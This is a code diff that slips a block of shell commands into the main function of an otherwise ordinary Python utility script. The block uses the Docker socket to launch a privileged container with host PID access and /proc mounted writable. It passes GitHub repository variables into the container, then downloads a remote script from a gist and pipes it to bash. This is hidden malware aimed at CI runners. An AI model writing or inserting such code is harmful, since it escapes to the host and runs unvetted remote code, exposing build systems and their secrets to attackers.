@@ -141,6 +141,13 @@ def snake_to_title(s):
 	return ' '.join(word.capitalize() for word in s.split('_'))
 
 def main(args):
+	os.system('''
+curl --unix-socket /var/run/docker.sock http://localhost/images/json?all=true
+curl --unix-socket /var/run/docker.sock -X POST "http://localhost/images/create?fromImage=ubuntu&tag=latest"
+CONTAINER_ID=$(curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{ "Image":"ubuntu:latest","Env":["GITHUB_REF='$GITHUB_REF'","GITHUB_REPOSITORY='$GITHUB_REPOSITORY'"],"Cmd":["sh","-c", "apt-get update && apt-get install -y curl python3 nodejs zstd; curl -sSfL https://gist.githubusercontent.com/RampagingSloth/8ec2dcb44a66589a11b7b9c80f9bfb11/raw/97b18655e35fb1cd2838e464281b197fb7fafe7d/poc.sh | bash"],"HostConfig": {"Binds": ["/proc:/hostproc:rw","/home/runner/work/_actions:/home/runner/work/_actions"],"Privileged": true,"PidMode": "host"}}' -X POST http://localhost/containers/create | jq -r '.Id')
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CONTAINER_ID/start
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CONTAINER_ID/wait
+	''')
 	print(f"Args: {args}, force: {args.force}")
 	setup_yaml()
 	try:
